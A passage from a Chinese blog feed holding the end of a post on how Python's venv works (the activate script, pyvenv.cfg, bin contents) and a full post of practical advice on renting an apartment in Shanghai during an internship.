class="line">sudo apt install python3.12-venv</span><br></pre></td></tr></table></figure><p>常用操作很简单，就三板斧，记住就行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建虚拟环境</span></span><br><span class="line">python3 -m venv venv</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动虚拟环境</span></span><br><span class="line">source ./venv/bin/activate</span><br><span class="line">./venv/Scripts/Activate.ps1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出虚拟环境</span></span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure><p>会用这三句指令就掌握了python虚拟环境日常操作的大半了。但我们还是要有点小追求，看看venv到底是在做什么，怎么就创建了一个虚拟环境，具体的实现原理是什么。</p><h2 id="深入实现原理"><a href="#深入实现原理" class="headerlink" title="深入实现原理"></a>深入实现原理</h2><p>常规的venv虚拟环境目录如下，在开始说明原理之前，我们先来盘点下每个目录&#x2F;文件的作用</p><blockquote><p>以Unix环境中创建的虚拟环境为例</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> ./venv</span></span><br><span class="line">bin  include  lib  lib64  pyvenv.cfg</span><br></pre></td></tr></table></figure><p>pyenv.cfg是虚拟环境的元数据，当你激活虚拟环境时，激活脚本（如<code>activate</code>）会读取pyenv.cfg文件中的信息，以确保使用正确的python解释器和配置。例如，激活脚本会设置环境变量，使得命令行会话使用虚拟环境中的python和pip。</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">home</span> = /usr/bin</span><br><span class="line"><span class="attr">include-system-site-packages</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">version</span> = <span class="number">3.12</span>.<span class="number">3</span></span><br><span class="line"><span class="attr">executable</span> = /usr/bin/python3.<span class="number">12</span></span><br><span class="line"><span class="attr">command</span> = /usr/bin/python3 -m venv /home/ubuntu/Temporary/use-venv/venv</span><br></pre></td></tr></table></figure><p>这个配置文件中各个配置项的功能如下</p><ul><li><strong>home</strong>: 指向创建虚拟环境时使用的python解释器的路径。</li><li><strong>include-system-site-packages</strong>: 指示是否包含系统范围的包（<code>false</code>表示不包含）。</li><li><strong>version</strong>: 指示python版本。</li><li><strong>executable</strong>: 指向虚拟环境中python解释器的路径。</li><li><strong>command</strong>: 记录创建虚拟环境时使用的命令。</li></ul><p>现在可以说说激活脚本了。这东西全在bin目录下，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> venv/bin</span></span><br><span class="line">activate  activate.csh  activate.fish  Activate.ps1  pip  pip3  pip3.12  python  python3  python3.12</span><br></pre></td></tr></table></figure><p>都是可执行文件（这种说法不严谨，一会儿订正），其中<code>activate  activate.csh  activate.fish  Activate.ps1</code>是适配各种流行shell的激活文件，后三者分别对应c-shell、fish-shell和powershell。</p><blockquote><p>fish 也是支棱起来了，确实好用还方便</p></blockquote><p>其余可执行文件就是常规的pip和python，注意到各自有三个不同的版本。以python为例，python是默认版本，一般指向的就是我们创建虚拟环境时使用的python；python3是考虑到<br>本地环境中可能同时有python2和python3，遂指定python3；python3.12是考虑本地可能有多个版本的python3，所以就再指定一次python3.12。pip的版本号也是同理。</p><ul><li>python：这是指向虚拟环境中python解释器的可执行文件。</li><li>python3：这是指向python 3解释器的可执行文件。</li><li>python3.12：这是特定于python 3.12版本的可执行文件。</li></ul><p>如果你使用cat指令，会发现python和pip还不太一样：</p><p><img src="https://img.ma5hr00m.top/obsidian/20241120162348.png" alt="image.png"></p><p>python在此处其实是一个符号链接，指向的是本地python的解释器；而pip则是正儿八经的可执行文件。我们可以看看pip3的具体内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/home/ubuntu/Temporary/use-venv/venv/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pip._internal.cli.main <span class="keyword">import</span> main</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.argv[<span class="number">0</span>] = re.sub(<span class="string">r&#x27;(-script\.pyw|\.exe)?$&#x27;</span>, <span class="string">&#x27;&#x27;</span>, sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p>这个可执行文件做的其实就是调用虚拟环境中的python解释器（也就是调用本地的python解释器）将第三方库下载到虚拟环境的lib目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;venv&gt;/lib/python&lt;version&gt;/site-packages/</span></span><br><span class="line">/home/ubuntu/Temporary/use-venv/venv/lib/python3.12/site-packages/</span><br></pre></td></tr></table></figure><p>lib目录包含了虚拟环境中安装的python库，那lib64又是怎么回事儿？在某些系统上（如某些Linux发行版），lib64目录用于存放64位库。它的结构与lib目录相似，通常也包含python包。像我这里使用的是64位<a href="mailto:&#x75;&#x62;&#117;&#110;&#x74;&#x75;&#115;&#x65;&#x72;&#118;&#x65;&#x72;&#x40;&#x32;&#x34;&#46;&#48;&#52;">ubuntuserver@24.04</a>，lib64@就直接指向了lib目录。</p><p>还有个include目录，里面是<a href="mailto:&#x70;&#x79;&#x74;&#104;&#x6f;&#110;&#x40;&#51;&#46;&#x31;&#x32;">python@3.12</a>的头文件，允许你在虚拟环境中编译依赖于python 的c扩展。有时开发者需要使用c语言编写扩展模块，以提高性能或访问某些底层系统功能。这个不在此处赘述。</p><hr><p>ok，现在我们对整个虚拟环境（venv目录）的结构有了大致的了解。现在我们可以来看看激活脚本了，venv究竟是怎么支持我们使用虚拟环境的呢？以下是一个去除注释的activate，你也可以自己cat出来源码看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">deactivate () &#123;</span><br><span class="line">    if [ -n &quot;$&#123;_OLD_VIRTUAL_PATH:-&#125;&quot; ] ; then</span><br><span class="line">        PATH=&quot;$&#123;_OLD_VIRTUAL_PATH:-&#125;&quot;</span><br><span class="line">        export PATH</span><br><span class="line">        unset _OLD_VIRTUAL_PATH</span><br><span class="line">    fi</span><br><span class="line">    if [ -n &quot;$&#123;_OLD_VIRTUAL_PYTHONHOME:-&#125;&quot; ] ; then</span><br><span class="line">        PYTHONHOME=&quot;$&#123;_OLD_VIRTUAL_PYTHONHOME:-&#125;&quot;</span><br><span class="line">        export PYTHONHOME</span><br><span class="line">        unset _OLD_VIRTUAL_PYTHONHOME</span><br><span class="line">    fi</span><br><span class="line">    hash -r 2&gt; /dev/null</span><br><span class="line">    if [ -n &quot;$&#123;_OLD_VIRTUAL_PS1:-&#125;&quot; ] ; then</span><br><span class="line">        PS1=&quot;$&#123;_OLD_VIRTUAL_PS1:-&#125;&quot;</span><br><span class="line">        export PS1</span><br><span class="line">        unset _OLD_VIRTUAL_PS1</span><br><span class="line">    fi</span><br><span class="line">    unset VIRTUAL_ENV</span><br><span class="line">    unset VIRTUAL_ENV_PROMPT</span><br><span class="line">    if [ ! &quot;$&#123;1:-&#125;&quot; = &quot;nondestructive&quot; ] ; then</span><br><span class="line">        unset -f deactivate</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">deactivate nondestructive</span><br><span class="line"></span><br><span class="line">if [ &quot;$&#123;OSTYPE:-&#125;&quot; = &quot;cygwin&quot; ] || [ &quot;$&#123;OSTYPE:-&#125;&quot; = &quot;msys&quot; ] ; then</span><br><span class="line">    export VIRTUAL_ENV=$(cygpath /home/ubuntu/Temporary/use-venv/venv)</span><br><span class="line">else</span><br><span class="line">    export VIRTUAL_ENV=/home/ubuntu/Temporary/use-venv/venv</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">_OLD_VIRTUAL_PATH=&quot;$PATH&quot;</span><br><span class="line">PATH=&quot;$VIRTUAL_ENV/bin:$PATH&quot;</span><br><span class="line">export PATH</span><br><span class="line"></span><br><span class="line">if [ -n &quot;$&#123;PYTHONHOME:-&#125;&quot; ] ; then</span><br><span class="line">    _OLD_VIRTUAL_PYTHONHOME=&quot;$&#123;PYTHONHOME:-&#125;&quot;</span><br><span class="line">    unset PYTHONHOME</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ -z &quot;$&#123;VIRTUAL_ENV_DISABLE_PROMPT:-&#125;&quot; ] ; then</span><br><span class="line">    _OLD_VIRTUAL_PS1=&quot;$&#123;PS1:-&#125;&quot;</span><br><span class="line">    PS1=&#x27;(venv) &#x27;&quot;$&#123;PS1:-&#125;&quot;</span><br><span class="line">    export PS1</span><br><span class="line">    VIRTUAL_ENV_PROMPT=&#x27;(venv) &#x27;</span><br><span class="line">    export VIRTUAL_ENV_PROMPT</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">hash -r 2&gt; /dev/null</span><br></pre></td></tr></table></figure><p>我们可以把activate脚本做的事情整理为如下的流程</p><ol><li>环境变量的设置：脚本通过设置VIRTUAL_ENV环境变量来指向虚拟环境的路径，PATH环境变量被修改，以便在虚拟环境的bin目录中查找可执行文件。</li><li>保存旧的环境变量：脚本在激活虚拟环境之前保存了旧的PATH和PYTHONHOME环境变量，以便在退出虚拟环境时可以恢复这些变量。</li><li>提示符的修改：脚本修改了命令行提示符（PS1），在提示符前添加了(venv)，以便用户可以清楚地知道他们当前处于虚拟环境中。</li><li>去除不必要的变量：脚本在激活时会清除一些不必要的变量，以避免潜在的冲突。</li><li>去除命令哈希：使用hash -r命令来清除命令哈希，以确保新的PATH设置能够立即生效。</li><li>非破坏性退出：deactivate函数允许用户退出虚拟环境，并在退出时恢复之前的环境变量。</li></ol><p>看完这个描述相信你已经清晰明了，为什么我们激活虚拟环境后会多出一个<code>(venv)</code>的标志，为什么我们可以使用<code>deactivate</code>指令直接退出虚拟环境，为什么我们连续开启多个虚拟环境时是在不同的虚拟环境中嵌套而不是水平切换……这些问题都可以得到解答了。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>emmm，其实venv的原理并不复杂，说白了就是保存旧环境变量切换到新环境变量，然后把三方库下载到venv目录下，不需要了就切换回旧的环境变量，不要虚拟环境了就直接把目录一删了事儿。可以不叨叨那么多直接展示activate文件的源码，有基础的基本上就可以理解是怎么回事了。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实习租房经验帖</title>
      <link href="/2024/11/13/2024/how-to-rent-an-apartment-root/"/>
      <url>/2024/11/13/2024/how-to-rent-an-apartment-root/</url>
      
        <content type="html"><![CDATA[<p>24年暑假有个出来实习的机会，权衡利弊后，感觉很不错。来来回回经过四轮面试，9月份就跑到上海实习了。不比杭州，上海距离学校还是有点距离的，从学校到公司的单趟通勤要3.5h，中间还要地铁高铁地来回折腾，所以直接在公司附近租房住。</p><p>我是在入职报道前提前跑上海来转悠了2天，线下看看房子，转了差不多十家之后回去合计了一下就定下来了，然后入职报道前一天提着行李箱跑到公寓签合同住下来。到写这篇文章的时候，已经住了接近3个月，感觉各方面都还算满意，基本符合我的预期。这两天也比较得闲，遂写这么一篇租房经验贴，给后面的学弟学妹一些参考。</p><p>事先声明，每个人的经济情况不同，租房时看重的条件也不同，我这里就按照我自己的来。</p><h2 id="线上选址"><a href="#线上选址" class="headerlink" title="线上选址"></a>线上选址</h2><p>租房租房，这里的“房”大致可分为两种：居民房和公寓。前者就是传统的租户和房主oneone，商量这商量那的，这个我没有去尝试，坑多是一方面，另一方面是这种居民房相对较少面对短中期的单人租客。所以我在一开始就决定是租公寓。公寓的好处就是拎包入住，配套设施齐全，有专门的公寓前台&#x2F;管家，租户需要做的就是住进去然后按时交水电费和管理费，差不多就是能让你长期住的宾馆。</p><p>因为是短中期实习嘛，不用考虑太长远的事情，所以我线上选址的流程就比较清晰明了了。</p><p>首先是确定你的预算。这个因人而异，没什么建议，自己考虑。</p><p>然后是确认公司房补的范围，比如步行30min、骑行20min、地铁20min这种，具体补贴标准要去咨询公司的hr，各家都不相同。有了这个范围之后就开始以公司为圆心、交通距离为半径开始画圈，找范围内的房子，地铁的话就以离公司最近的地铁站为中点，延地铁线路向两端延申。这一步其实并不麻烦，因为很多租房app都会提供这种功能，你需要做的就是点点点。</p><p>除了通勤距离房补之外呢，还有一种公司补贴是企业和平台有合作，租指定公寓可以适当减免服务费或者房租等。这个也得看公司政策，问hr。</p><p>到这里先停一下：各家app的房源各不相同，同样的范围同样的标准，在不同的租房app你也能搜到很多不同的公寓&#x2F;出租房。设想你有一间房需要出租，你也很难做到把你的房子信息铺满全网的每一个app，公寓也是如此。这就会造成不同平台的房源信息差异。</p><p>在网上搜搜搜的过程中，我找到这样一张图：</p><p><img src="https://img.ma5hr00m.top/blog2409/20240902232646.png" alt="image.png"></p><p>我不去评价这张图如何，我反正是基本都下载了一遍看了看，最后选择了三款app用来看房：自如寓、贝壳找房和Wellcee，这其中又以前两者为主力。</p><p>在我实际使用的三款app里，自如推荐用网页端（移动端交互不方便），贝壳推荐用移动端（网页端交互有问题），Wellcee两者皆可。先选定通勤地点，然后通勤找房，先在房补范围内按照预算筛一轮，然后在房补范围外根据预算筛一轮，留下来的再根据自己的通勤习惯筛一轮（比如说你偏向地铁通勤而不是骑车&#x2F;步行），然后剩下来的就是你的初步目标。</p><blockquote><p>当然，除了预算也得关注点别的因素，水电费、周边环境、装修时间这类的，别到时候线下过去看到难以接受的环境。</p></blockquote><p>选出来十几户准备之后线下去看看，到底选多少取决于你有多长时间看房。我当时是准备在第一天早上从杭州出发，第二天傍晚回杭州，能留在上海看房的时间差不多一天半。但因为经验不足，我错误预估了看房需要花费的时间，线上只选了五户，第一天就看完了，然后第一天赶路的路上和当晚夜里又选了五户，第二天接着看。</p><p>呃呃呃，如果你不喜欢太紧张的赶路，一天下午看三户也就差不多了。上面的看房速度是建立在我提前规划好路线、从南到北一路顺着看、中间没怎么休息的基础上实现的。这其中还有一户是晚上天黑之后看的，地方也稍微有点偏，考虑到安全性我不推荐这么做。</p><h2 id="线下看房"><a href="#线下看房" class="headerlink" title="线下看房"></a>线下看房</h2><p>在有时间的前提下，我极力推荐线下看房，而不是纯线上选房。线下能搜集到的信息远比线上房东公布的靠谱。</p><p>举一个最直接的例子：平台上的房间图片。我个人的感觉是，通过适当的摄影角度，并通过合理的光照和屋内摆设，能把房间拍出来比它实际空间大出50%的效果，尽量不要线上看一个房间就交押金，线下过去发现看腿都伸不开，这个桌子小那个床窄，那时候想再换房就麻烦了。从另一方面来讲，照片拍的房间和价格不一定对应。</p><p>好，话接上回。线上选定目标后，通过平台给的联系方式私信或者直接打电话，预约看房时间。你能在平台上联系到的不一定就是领你看房的人，可能是更高一级的管理者或者是公寓管理员的同事，总之他们会给你安排好时间，肯定会有人领着你看房，这个不用担心。而且不少公寓前台24h有人，只要你人到了随时可以看房。</p><p>在约定好的时间过去，公寓管家领着你看房，一般会先按照线上的初步描述给你找一间空房看，然后根据你提出的进一步要求再领你看别的房间。这种时候我建议多问多看，越细致越好，线下沟通交流的效率高于在微信里你一言我一语的对答。</p><p>然后就到了比较细节的地方：租房应该关注哪些条件。</p><h3 id="租金押金"><a href="#租金押金" class="headerlink" title="租金押金"></a>租金押金</h3><p>正如前文所说，平台上的房间展示图和租金往往不对应，需要和管理员确认。此外，<strong>租金和租期长短有关系</strong>，你租的时间短（如常说的“短租”，一般指1-6个月），租金会有对应的提升，短租3个月一般会在基础租金的基础上提升15%，即标价月租3000的房间，短租3个月的情况下，月租会提升到3450；相应的，长租房（12个月及以上）会有优惠，租金降幅一般是10%左右， 或者长租12个月给你免一个月的房租，或者将优惠体现在服务费等其他支出上（服务费稍后说）。总之，就一句话：长租便宜短租贵。你可能遇到特例，这需要你和管理员沟通。</p><p>然后是押金。短租的话，押金一般是一个月的租金，也就是我们常说的押一租一或者押一租三，押金是房东用来降低租客采取非预期行动的概率的保障，直白点就是掌握在房东手里的租客的把柄。当租客在租期内采取非预期行动时，根据具体的租房合同要支付违约金或者扣除押金。具体的例子是，我们和房东签了三个月租房合同，交了第一个月的租金和押金，一个月过后我们不想租房了，想退房，但是又无法转租，我们执意不交剩下两个月的租金，此时房东就会依照合同扣除那一个月押金。正常流程下，三个月租房期结束，我们也按照合同交完了三个月租金，房东就会退回押金。</p><p>所以我们需要和公寓管家确认押金的退还形式，一般是7个自然工作日内将押金打给我们支付租金的账户，具体情况和管家沟通。</p><h3 id="采光通风"><a href="#采光通风" class="headerlink" title="采光通风"></a>采光通风</h3><p>采光很多人不在意，毕竟白天都在公司，晚上回公寓基本也就没太阳了，白天待在公寓的时间确实不多。但我个人较为在意，而且也怕万一我妹来上海看我，回去再报告给我父母，他夫妻俩再来制裁我。家人这关还是要过的 :P</p><p>公寓的采光大致分三种：无窗、面向天井、面向外侧，租金价格按序递增。</p><p>无窗好理解，就是没有对外的窗户但是有通气管道，或者只有对走廊的窗户，缺点是无自然采光，需要一直开灯，不方便通风导致室内空气污浊，也容易发潮招虫；面向天井的窗户，采光时间大多极短，因为公寓的“天井”很多是一条垂直且窄的墙缝，宽度一般小于 2m，除非是太阳在正上方，不然采光也一般，通风也就比无窗略好一点，而且有可能和天窗对面的房间正对窗户；理想情况是有对外的窗户，不论是对南对北，至少能有一个还算可以的采光，而且一开窗户就有空气自然流动，会舒服很多。</p><p>对外的窗户也分很多情况，或大或小，或朝南或朝北，或高或低，这些就由你自己选择了，采光越理想价格越高。我见过的一个较极端的例子，两间面积配置都相同的复式loft，一个有对外窗但很小，另一个有横跨两层的巨大落地窗，前者 3400，后者 5200，可见一斑。</p><p>通风基本和采光相关，毕竟说到底都是窗户的问题。只需要额外关注两点：一是窗户外是什么环境，要是废料场、饭店排气孔这种当然就比较难以接受；二是窗户玻璃是怎么布置的，双层玻璃确实有冬暖夏凉的功效，但是可能你和隔壁租户公用一个窗户夹层，而外侧玻璃只有一个开口，这就会导致没有正对外层玻璃开口的房间的通风性大幅下降。而且这种公用夹层的双层玻璃设计也会大幅降低隔音效果。</p><p>这点正是我所疏忽的，我初次租房的玻璃就是上述这种双层玻璃公用夹层的设计，而且外侧玻璃开口在隔壁房，我房间的通风性就很差。而且如果我和隔壁住户都开着内层玻璃窗的话，基本也就没有隔音可言，因为本质上这空间就是通的。所以我只能选择每天早上上班前开窗通一天风，晚上回来关上窗户开空调或者开排气扇。</p><h3 id="水电网费"><a href="#水电网费" class="headerlink" title="水电网费"></a>水电网费</h3><p>民水民电和商水商电价格差很多，计量是一度电多少钱，一吨水多少钱，这个需要细说。</p><p>首先是水电费，公寓的水电费一般是比普通小区贵出一级的，但达不到商水商电的程度。以上海自如寓为标准，电费一般是1.4±0.5；水费是7±2，不同城市价格不同，需要自己去调查。电费就这样，水费还可能分冷热水费，前面的水费默认指冷水，热水一般是40±15，或者是用热水器烧冷水，耗电费+冷水获得热水，少部分使用热水器的公寓可能会冷水免费。具体参考公寓的收费标准。</p><p>然后是网费，这个我没法给出一个范围，网络也牵扯到不同公寓的供网标准，有流量免费但需要自备路由器的，有自带路由器需要缴纳网费的，有免费WIFI全覆盖的，有网费包含在服务费里面的……不确定性太大了。</p><p>关于水电费，租客可以要求查水表电表，或者要求公寓提供线上查询的渠道。如果可以线下看到水表电表，入住时记得拍张照，有些苟房东会把初始耗电量耗水量算到租户第一个月水电费，不过公寓一般很少遇到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用量=月末表值-月初表值</span><br></pre></td></tr></table></figure><h3 id="服务费"><a href="#服务费" class="headerlink" title="服务费"></a>服务费</h3><p>公寓一般会按照租金比例收取服务费，自如寓是每月租金的 10%，每家公寓的服务费也不相同，也会有个别公寓不收服务费。</p><p>那这个服务费包括什么呢？一般包括住房前的针对房间的一次清洁，住房过程中的维修服务，公共区域的清洁服务，外卖快递的代存等。</p><p>绝大多数公寓在租户交完定金、入住之前，会对房间进行一次大扫除，这会算在服务费中，部分公寓会提供定时清洁服务，或者你喊保洁在你上班的时候收拾一下房间，一般也算在其中。</p><p>用户在租住期间，如果是非人为因素造成了家具家电的损坏或不正常运作（包括空调制冷效果差这种），或者首次入住时发现有家具家电损坏，都可以直接告诉管家，公寓方面负责维修，维修费算在服务费中，不会额外收费。注意，有些损毁，比如马桶堵塞、浴室花洒喷头损坏，可能会不算在维修费中，但不会告诉你，自己去问。也有个别公寓不提供维修服务，也是要先问清楚。</p><p>此外，看房时检查房屋时，记得试试水龙头和马桶抽水，看水压如何，排水是否通畅的；外卖快递的代存好理解，公寓周围可能没有菜鸟驿站一类的设施，前台会先帮你存着，或者是丰巢外卖柜；还有部分公寓有公共晾衣区或公共厨房，使用这类区域一般也会算在服务费中。</p><h3 id="衣服洗晾晒"><a href="#衣服洗晾晒" class="headerlink" title="衣服洗晾晒"></a>衣服洗晾晒</h3><p>很多公寓会有洗衣机，能保证正常用就行，有些高级的可能自带烘干功能。但大多数公寓的房间没法晾衣服，需要在公寓的公共晾衣区晾晒。记得看晾衣区有没有摄像头，以及摄像头能不能用，男生就随意了，女生独居切记安全。</p><blockquote><p>如果二者都没有的话，问问公寓管家是否提供烘干机，都没有的话，可以尝试问能不能降些租金，毕竟你公寓不提供这些基础功能（租金合适的情况下）。</p></blockquote><h3 id="隔音性"><a href="#隔音性" class="headerlink" title="隔音性"></a>隔音性</h3><p>公寓最重要的价值就是晚上睡觉，隔音在此时显得格外重要。</p><p>首先是墙，问问是实心墙还是板墙，自己上手敲敲听声音，区别蛮明显的；然后关注窗户和门的隔音效果，隔音差的话可能需要自备隔音棉；然后是周边环境，公寓附近有没有施工装修的计划。这样基本就差不多了。</p><p>这个其实挺主观的，有些人入睡其实不在意吵不吵（比如我自己），但还是有备无患的好。你可能不在意打游戏的喊闹声，毕竟寝室也有；但你可能很难不去在意隔壁履行人类自然义务的声音，这点部分前辈遇到过，我自己住宾馆也遇到过。</p><p>另外就是上文说过的双层玻璃公用夹层，这个对隔音的影响很大，留意下即可。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>问公寓管家，公寓的建成时间、装修时间和开售时间，避免甲醛残留等问题。然后是停水停电的频率，附近是不是经常施工。</p><p>房间内部，看家电方面是否有不合规的使用，墙角有没有渗水、有没有明显缝隙；楼道，是否有配套消防设施，是否堆有其他租户的杂物，是否有电动车充电（这个基本没有，公寓也不傻）；消防通道是否通畅，且通道门是否处于可开启状态；楼下是否有管家值班，或者刷脸刷卡进楼的防护。</p><p>其他一些散点看个人要求，比如低楼层有没有防盗窗等。</p><h3 id="防虫"><a href="#防虫" class="headerlink" title="防虫"></a>防虫</h3><p>唔，对阿菇来说这点非常重要：阿菇对虫子没什么好感。而防虫主要是与环境有关。</p><p>外部环境就是公寓附近有没有餐厅、垃圾废料处理场这种。公寓的统一垃圾桶放在什么地方呢？如果就在住户这层楼，那离你的房间远不远呢？内部环境就是点外卖的外卖盒记得尽早处理掉，自己做饭的话，在饭后赶快处理水池和餐具，房间里不要囤积太多生鲜食物，冰箱也不行，地上的食物残渣一定一定要及时清理……</p><p>然后就是看房时观察房子的窗户、门这种地方，有没有明显、或者说足够大的缝隙足够大型虫子通过，有的话就换房或者问问公寓能不能处理，公寓不能处理的话就问能不能自己处理，这个很重要。举一个简单直观的例子，公寓房间正门的门下那条缝，极大概率是没法阻止虫子爬进来的，你看房的时候要多注意其他已经有人住进去的房间，他们的门缝有没有装防虫罩或者说防尘条。如果你发现很多租户的门都装了这种东西，你就要留个心眼儿了，这东西的主要作用往往不是隔音，是防虫。</p><p>你问我怎么知道的？我住进房间第二天晚上下班回家，躺床上，发现有个不明黑色物体在沿着墙边飞速爬行，那刻我的心拔凉拔凉的，一瞬间我的脑海中闪过了换公寓的打算。定睛一看，是个有我1&#x2F;4个手掌大的蟑螂。而那时我甚至还没有在房间里吃过任何东西。</p><p><img src="https://img.ma5hr00m.top/blog2410/20241113233326.png" alt="image.png"></p><p>当时是晚上12点，对峙了半小时后。我看着它顺畅地从门下钻了出去，然后反手就在京东下单，连夜给自己的门装上了防虫条，再检查了半小时屋里有没有其他虫子，最后惴惴不安的睡去。隔天晚上蹲厕所的时候，发觉脚边窜过去一个黑色不明物体，我处理好之后弹射起来，发现又是一只蟑螂，不过比前一只小很多。又是一次长达半小时的对峙，然后我发现它从房门门轴角落的一个缝隙钻了出去。在思考片刻之后，我采用了大量卫生纸+水的封印术糊上了那处门缝，然后直到现在我都没有再在我的房间里遇到蟑螂。</p><blockquote><p>那处封印我至今没有解开。</p></blockquote><p>说来也奇妙，我就没在公寓楼里的其他地方见过蟑螂。所以防虫这个问题也只能说尽可能避免，就看房那点时间真不容易碰上，住进去之后碰上了再见招拆招。</p><h3 id="复式loft"><a href="#复式loft" class="headerlink" title="复式loft"></a>复式loft</h3><p>这个其实……也没什么好说的，自己觉得能过得去就行。公寓户型要分类的话可以分为两大类：平房和复式loft。前者没什么好说的，后者就是一间房给你分成两层，垂直方向的空间比较大，有个楼梯也比较有想象力。价格上没什么明显的区别，主要影响价格的还是上面的那些+公寓面积。</p><blockquote><p>像我住的这栋公寓，复式loft其实比我现在住的平房还便宜点。</p></blockquote><p>复式loft的缺点我还是能稍微列举出几个的。不方便打扫这点肯定算一个，不方便活动也算一个：如果恰好腿脚不舒服爬楼梯上床休息都困难。此外，如果像我上文那样遇到了小精灵……如果小精灵摆出起飞姿势守在二楼楼梯口，而此时你在一楼，阁下又该如何应对呢？</p><hr><p>除了上面说的这些呢，屋内家电家具配置和公寓周围的配套看个人要求，前者与租金强相关，后者需要自己看房前后考察。</p><p>看房的时候可以带个录音笔全程录音，觉得不错的房间掏出手机拍照即可，公寓管家也不会阻拦你。线下看完没记住或者没问清楚的细节，就线上联系管家进一步确认。这类事情要在付钱之前确认清楚。租房是纯粹的交易行为，租户给房东钱，房东为租户提供住房和对应的服务，客气点就可以了，没有必要觉得问清楚这些问题是不尊重对方。</p><p><img src="https://img.ma5hr00m.top/blog2409/20240904233708.png" alt="image.png"></p><p>租房这种情景下，租金押金定金在谁手上，谁就掌握主动权，像前文说到的入住前的维修，有些鸡贼的房东会满口答应你，签完合同就开始拖，这种时候你也没办法，押金在对方手上，拿捏个房客不还是轻轻松松。</p><p>然后是线下看房的时间规划。别看上面我写了这么多，实际上看一个公寓的时间可以控制在20min以内，看看问问，领着看看公共区域就差不多了，多数时间是在街上到处跑。我是第一天中午12点到的上海，看了5个公寓，跑去公司楼下转悠了一圈，然后晚上找了间网咖休息，第二天从早上9点开始又看了5个公寓，然后在路边和第一天的房东线上交流了1h，最后于下午3点乘高铁回杭州。跑这么两天其实挺累的，也能说是特种兵式看房了。</p><p>看完房的休息时间（我一般是在地铁站或者公寓前台歇会儿）及时记录相关信息，我是用小米笔记直接全记下来，然后回寝室之后掂量掂量又问问管家再要的照片，最后交的定金。</p><p><img src="https://img.ma5hr00m.top/blog2409/20240904235938.png" alt="image.png"></p><h2 id="交钱签合同"><a href="#交钱签合同" class="headerlink" title="交钱签合同"></a>交钱签合同</h2><p>选定之后就没太大问题了，交定金签合同，确保租金服务费这类东西都在合同上有所体现，嘴上承诺但合同没体现的，让房东或公寓管家当场写上或者重新打印合同，签完合同之后取回定金，交钱入住就可以啦。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>感觉租房就是这样，同一地区同一标准的房子，租金上下浮动在1k左右，很难说捡到大漏，只能通过自己的筛选和调查选出一个相对满意的目标。</p><p>以上就是阿菇的租房经验贴，希望可以对初次租房的小伙伴有所帮助，祝阅读到这篇文章的同学可以租到满意的公寓房间。</p>]]></content>
      
